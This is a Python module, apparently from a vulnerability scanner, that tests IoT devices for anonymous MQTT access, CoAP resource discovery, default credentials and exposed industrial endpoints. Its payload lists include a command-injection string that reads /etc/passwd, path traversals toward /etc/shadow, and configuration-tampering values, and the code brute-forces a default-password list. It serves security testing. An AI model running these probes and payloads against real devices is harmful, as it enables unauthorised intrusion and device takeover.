#!/usr/bin/env python3
"""
IoT Security Testing Module
Tests for Internet of Things vulnerabilities including:
- MQTT broker security
- CoAP protocol vulnerabilities
- Device authentication bypasses
- Firmware vulnerabilities
- Default credentials
- Protocol-specific attacks
- Industrial control system flaws
"""

import requests
import socket
import struct
import json
import base64
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import urllib.parse
import threading
import time

class IoTSecurityTester:
    def __init__(self, timeout=10, level='normal'):
        self.timeout = timeout
        self.level = level
        self.vulnerabilities = []
        
        # IoT protocols and services
        self.iot_protocols = {
            # MQTT vulnerabilities
            'mqtt': {
                'ports': [1883, 8883, 8080, 8884],
                'endpoints': ['/mqtt', '/broker', '/publish', '/subscribe'],
                'payloads': [
                    # MQTT injection
                    'test/../../admin/config',
                    '$SYS/broker/clients/connected',
                    'device/+/command/#',
                    
                    # Authentication bypass
                    '{"username": "admin", "password": ""}',
                    '{"client_id": "../admin"}',
                ]
            },
            
            # CoAP vulnerabilities
            'coap': {
                'ports': [5683, 5684],
                'endpoints': ['/.well-known/core', '/config', '/device', '/sensor'],
                'payloads': [
                    # CoAP resource manipulation
                    'GET /.well-known/core',
                    'PUT /config {"admin": true}',
                    'POST /device/reset',
                    
                    # CoAP observe attacks
                    'GET /sensor OBSERVE:0',
                ]
            },
            
            # HTTP-based IoT APIs
            'iot_http': {
                'ports': [80, 443, 8080, 8443, 9000],
                'endpoints': [
                    '/api/device', '/api/config', '/api/status', '/api/control',
                    '/device', '/config', '/admin', '/setup', '/cgi-bin'
                ],
                'payloads': [
                    # Device command injection
                    '{"command": "reboot && cat /etc/passwd"}',
                    '{"action": "update", "firmware": "../../../etc/shadow"}',
                    
                    # Configuration tampering
                    '{"ssid": "evil_ap", "password": "hacked"}',
                    '{"device_id": "../../admin", "role": "admin"}',
                ]
            },
            
            # Industrial protocols
            'industrial': {
                'ports': [502, 102, 44818, 20000],  # Modbus, S7, OPC-UA, DNP3
                'endpoints': ['/scada', '/plc', '/hmi', '/opcua', '/modbus'],
                'payloads': [
                    # SCADA command injection
                    'WRITE_REGISTER 1 65535',
                    'READ_COILS 0 100',
                    
                    # OPC-UA exploitation
                    'opc.tcp://server:4840/freeopcua/server/',
                ]
            }
        }
        
        # Default credentials database
        self.default_credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '12345'),
            ('root', 'root'), ('root', 'toor'), ('root', ''),
            ('user', 'user'), ('guest', 'guest'), ('admin', ''),
            ('administrator', 'administrator'), ('support', 'support'),
            ('admin', 'admin123'), ('admin', '1234'), ('pi', 'raspberry'),
            ('ubnt', 'ubnt'), ('cisco', 'cisco'), ('default', 'default')
        ]
        
        # IoT vulnerability indicators
        self.vulnerability_indicators = {
            'mqtt_vulnerable': [
                'anonymous allowed', 'unauthenticated', 'broker info',
                'client list', '$SYS', 'wildcard subscription', 'no authentication'
            ],
            'coap_vulnerable': [
                'coap server', 'resource discovery', 'observable',
                'unsecured resource', 'public access', 'no dtls'
            ],
            'iot_device_vulnerable': [
                'default password', 'telnet enabled', 'ssh enabled',
                'firmware version', 'debug mode', 'factory reset',
                'configuration backup', 'device information'
            ],
            'industrial_vulnerable': [
                'modbus', 'plc', 'scada', 'hmi', 'opc server',
                'register write', 'coil status', 'ladder logic',
                'engineering station'
            ]
        }
        
        # Device fingerprints for common IoT devices
        self.device_fingerprints = {
            'router': ['router', 'gateway', 'linksys', 'netgear', 'tplink', 'dlink'],
            'camera': ['camera', 'webcam', 'ip cam', 'surveillance', 'hikvision', 'dahua'],
            'smart_device': ['smart', 'iot', 'home', 'alexa', 'google', 'nest'],
            'industrial': ['siemens', 'schneider', 'allen bradley', 'ge fanuc', 'mitsubishi'],
            'printer': ['printer', 'canon', 'hp', 'epson', 'brother', 'lexmark']
        }
    
    def test_mqtt_vulnerabilities(self, url, port=1883):
        """Test for MQTT broker vulnerabilities"""
        results = []
        
        try:
            # Extract hostname from URL
            hostname = url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            
            # Test MQTT connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            try:
                sock.connect((hostname, port))
                
                # MQTT CONNECT packet (anonymous connection attempt)
                connect_packet = b'\x10\x10\x00\x04MQTT\x04\x02\x00\x3c\x00\x04test'
                sock.send(connect_packet)
                
                response = sock.recv(1024)
                if len(response) >= 4 and response[0] == 0x20:  # CONNACK packet
                    if response[3] == 0x00:  # Connection accepted
                        vuln = {
                            'type': 'MQTT Anonymous Access',
                            'severity': 'High',
                            'url': f"{hostname}:{port}",
                            'method': 'MQTT',
                            'payload': 'Anonymous MQTT connection',
                            'evidence': 'MQTT broker allows anonymous connections',
                            'attack_vector': 'Unauthenticated MQTT access',
                            'impact': 'Message interception, device control, data theft',
                            'remediation': 'Enable MQTT authentication and authorization',
                            'port': port
                        }
                        results.append(vuln)
                        print(f"{Fore.RED}[!] MQTT anonymous access: {hostname}:{port}{Style.RESET_ALL}")
                
                sock.close()
            except:
                sock.close()
                
            # Test MQTT over WebSocket
            mqtt_endpoints = self.iot_protocols['mqtt']['endpoints']
            for endpoint in mqtt_endpoints:
                try:
                    test_url = f"{url.rstrip('/')}{endpoint}"
                    response = requests.get(test_url, timeout=self.timeout, verify=False)
                    
                    for indicator in self.vulnerability_indicators['mqtt_vulnerable']:
                        if indicator.lower() in response.text.lower():
                            vuln = {
                                'type': 'MQTT Web Interface Vulnerability',
                                'severity': 'Medium',
                                'url': test_url,
                                'method': 'GET',
                                'payload': 'MQTT web endpoint access',
                                'evidence': f"MQTT vulnerability indicator: {indicator}",
                                'attack_vector': 'MQTT web interface exposure',
                                'impact': 'Broker information disclosure, configuration access',
                                'status_code': response.status_code
                            }
                            results.append(vuln)
                            print(f"{Fore.YELLOW}[!] MQTT web vulnerability: {test_url} - {indicator}{Style.RESET_ALL}")
                            break
                except:
                    continue
                    
        except Exception:
            pass
        
        return results
    
    def test_coap_vulnerabilities(self, url, port=5683):
        """Test for CoAP protocol vulnerabilities"""
        results = []
        
        try:
            hostname = url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            
            # CoAP GET request for resource discovery
            coap_packet = b'\x40\x01\x12\x34\xbb.well-known\x04core'  # GET /.well-known/core
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            
            try:
                sock.sendto(coap_packet, (hostname, port))
                response, _ = sock.recvfrom(1024)
                
                if len(response) >= 4 and (response[0] & 0xC0) == 0x40:  # CoAP response
                    vuln = {
                        'type': 'CoAP Resource Discovery',
                        'severity': 'Medium',
                        'url': f"coap://{hostname}:{port}/.well-known/core",
                        'method': 'CoAP GET',
                        'payload': 'CoAP resource discovery',
                        'evidence': 'CoAP server responds to resource discovery',
                        'attack_vector': 'CoAP resource enumeration',
                        'impact': 'Resource discovery, service enumeration',
                        'remediation': 'Restrict CoAP resource access',
                        'port': port
                    }
                    results.append(vuln)
                    print(f"{Fore.CYAN}[!] CoAP service discovered: {hostname}:{port}{Style.RESET_ALL}")
                
                sock.close()
            except:
                sock.close()
                
        except Exception:
            pass
        
        return results
    
    def test_default_credentials(self, url):
        """Test for default credentials on IoT devices"""
        results = []
        
        # Test common authentication endpoints
        auth_endpoints = ['/login', '/auth', '/admin', '/cgi-bin/luci', '/setup']
        
        for endpoint in auth_endpoints:
            test_url = f"{url.rstrip('/')}{endpoint}"
            
            for username, password in self.default_credentials:
                try:
                    # Test form-based authentication
                    auth_data = {
                        'username': username, 'password': password,
                        'user': username, 'pass': password,
                        'login': username, 'passwd': password
                    }
                    
                    response = requests.post(test_url, data=auth_data, 
                                           timeout=self.timeout, verify=False, allow_redirects=False)
                    
                    # Check for successful authentication indicators
                    success_indicators = ['dashboard', 'welcome', 'logout', 'admin panel', 'configuration']
                    
                    if (response.status_code in [200, 302] and 
                        any(indicator in response.text.lower() for indicator in success_indicators)):
                        
                        vuln = {
                            'type': 'Default Credentials',
                            'severity': 'Critical',
                            'url': test_url,
                            'method': 'POST',
                            'payload': f"Username: {username}, Password: {password}",
                            'evidence': 'Successful login with default credentials',
                            'attack_vector': 'Default credential authentication',
                            'impact': 'Complete device compromise, configuration access',
                            'remediation': 'Change default credentials immediately',
                            'credentials': f"{username}:{password}",
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        print(f"{Fore.RED}[!] CRITICAL: Default credentials found: {test_url} ({username}:{password}){Style.RESET_ALL}")
                        
                    # Also test HTTP Basic Authentication
                    response_basic = requests.get(test_url, auth=(username, password), 
                                                timeout=self.timeout, verify=False)
                    
                    if response_basic.status_code == 200 and response_basic.status_code != 401:
                        vuln = {
                            'type': 'Default HTTP Basic Auth',
                            'severity': 'Critical',
                            'url': test_url,
                            'method': 'GET',
                            'payload': f"Basic Auth - {username}:{password}",
                            'evidence': 'HTTP Basic Authentication with default credentials',
                            'attack_vector': 'Default HTTP Basic Authentication',
                            'impact': 'Device access, configuration modification',
                            'credentials': f"{username}:{password}",
                            'status_code': response_basic.status_code
                        }
                        results.append(vuln)
                        print(f"{Fore.RED}[!] CRITICAL: Default HTTP Basic Auth: {test_url} ({username}:{password}){Style.RESET_ALL}")
                        
                except Exception:
                    continue
        
        return results
    
    def test_iot_device_vulnerabilities(self, url):
        """Test for general IoT device vulnerabilities"""
        results = []
        
        iot_config = self.iot_protocols['iot_http']
        
        for endpoint in iot_config['endpoints']:
            test_url = f"{url.rstrip('/')}{endpoint}"
            
            try:
                response = requests.get(test_url, timeout=self.timeout, verify=False)
                
                # Check for IoT device vulnerability indicators
                for indicator in self.vulnerability_indicators['iot_device_vulnerable']:
                    if indicator.lower() in response.text.lower():
                        vuln = {
                            'type': 'IoT Device Vulnerability',
                            'severity': 'High' if 'debug' in indicator or 'telnet' in indicator else 'Medium',
                            'url': test_url,
                            'method': 'GET',
                            'payload': 'IoT device enumeration',
                            'evidence': f"IoT device vulnerability: {indicator}",
                            'attack_vector': 'IoT device information disclosure',
                            'impact': 'Device fingerprinting, attack surface discovery',
                            'remediation': 'Secure device configuration, disable unnecessary services',
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        print(f"{Fore.YELLOW}[!] IoT device vulnerability: {test_url} - {indicator}{Style.RESET_ALL}")
                        break
                
                # Device fingerprinting
                response_text = response.text.lower()
                for device_type, keywords in self.device_fingerprints.items():
                    if any(keyword in response_text for keyword in keywords):
                        print(f"{Fore.CYAN}[*] Device fingerprint detected: {device_type} at {test_url}{Style.RESET_ALL}")
                        break
                
                # Test IoT-specific payloads
                for payload in iot_config['payloads']:
                    try:
                        if payload.startswith('{'):
                            # JSON payload
                            headers = {'Content-Type': 'application/json'}
                            response_payload = requests.post(test_url, data=payload, headers=headers,
                                                           timeout=self.timeout, verify=False)
                        else:
                            # Form payload
                            response_payload = requests.post(test_url, data={'cmd': payload},
                                                           timeout=self.timeout, verify=False)
                        
                        # Check for command injection indicators
                        if response_payload.status_code == 200 and ('root:' in response_payload.text or 'etc/passwd' in response_payload.text):
                            vuln = {
                                'type': 'IoT Command Injection',
                                'severity': 'Critical',
                                'url': test_url,
                                'method': 'POST',
                                'payload': payload,
                                'evidence': 'Command injection successful - system file access',
                                'attack_vector': 'IoT command injection',
                                'impact': 'Remote code execution, system compromise',
                                'status_code': response_payload.status_code
                            }
                            results.append(vuln)
                            print(f"{Fore.RED}[!] CRITICAL: IoT command injection: {test_url}{Style.RESET_ALL}")
                            
                    except Exception:
                        continue
                        
            except Exception:
                continue
        
        return results
    
    def test_industrial_protocol_vulnerabilities(self, url):
        """Test for industrial protocol vulnerabilities"""
        results = []
        
        if self.level == 'extreme':  # Only test industrial protocols in extreme mode
            industrial_config = self.iot_protocols['industrial']
            
            for endpoint in industrial_config['endpoints']:
                test_url = f"{url.rstrip('/')}{endpoint}"
                
                try:
                    response = requests.get(test_url, timeout=self.timeout, verify=False)
                    
                    for indicator in self.vulnerability_indicators['industrial_vulnerable']:
                        if indicator.lower() in response.text.lower():
                            vuln = {
                                'type': 'Industrial Protocol Vulnerability',
                                'severity': 'Critical',
                                'url': test_url,
                                'method': 'GET',
                                'payload': 'Industrial system enumeration',
                                'evidence': f"Industrial system detected: {indicator}",
                                'attack_vector': 'Industrial system exposure',
                                'impact': 'Critical infrastructure compromise, safety risks',
                                'remediation': 'Isolate industrial systems, implement security controls',
                                'status_code': response.status_code
                            }
                            results.append(vuln)
                            print(f"{Fore.RED}[!] CRITICAL: Industrial system exposed: {test_url} - {indicator}{Style.RESET_ALL}")
                            break
                            
                except Exception:
                    continue
        
        return results
    
    def test_iot_security_vulnerabilities(self, targets):
        """Main function to test IoT security vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Starting IoT security testing...{Style.RESET_ALL}")
        
        all_vulnerabilities = []
        
        # Handle different target formats
        if isinstance(targets, str):
            targets = [{'url': targets, 'subdomain': targets}]
        elif not isinstance(targets, list):
            targets = [targets]
        
        for target in targets:
            if isinstance(target, str):
                url = target
            else:
                url = target.get('url', target.get('subdomain', ''))
            
            if not url.startswith('http'):
                url = f"http://{url}"
            
            print(f"{Fore.CYAN}[*] Testing IoT security: {url}{Style.RESET_ALL}")
            
            # Test for default credentials (always run)
            default_cred_vulns = self.test_default_credentials(url)
            all_vulnerabilities.extend(default_cred_vulns)
            
            # Test IoT device vulnerabilities
            iot_device_vulns = self.test_iot_device_vulnerabilities(url)
            all_vulnerabilities.extend(iot_device_vulns)
            
            # Advanced protocol testing for moderate/extreme levels
            if self.level in ['moderate', 'extreme']:
                # Test MQTT vulnerabilities
                for port in self.iot_protocols['mqtt']['ports']:
                    mqtt_vulns = self.test_mqtt_vulnerabilities(url, port)
                    all_vulnerabilities.extend(mqtt_vulns)
                
                # Test CoAP vulnerabilities
                for port in self.iot_protocols['coap']['ports']:
                    coap_vulns = self.test_coap_vulnerabilities(url, port)
                    all_vulnerabilities.extend(coap_vulns)
                
                # Test industrial protocol vulnerabilities (extreme only)
                industrial_vulns = self.test_industrial_protocol_vulnerabilities(url)
                all_vulnerabilities.extend(industrial_vulns)
        
        self.vulnerabilities = all_vulnerabilities
        return all_vulnerabilities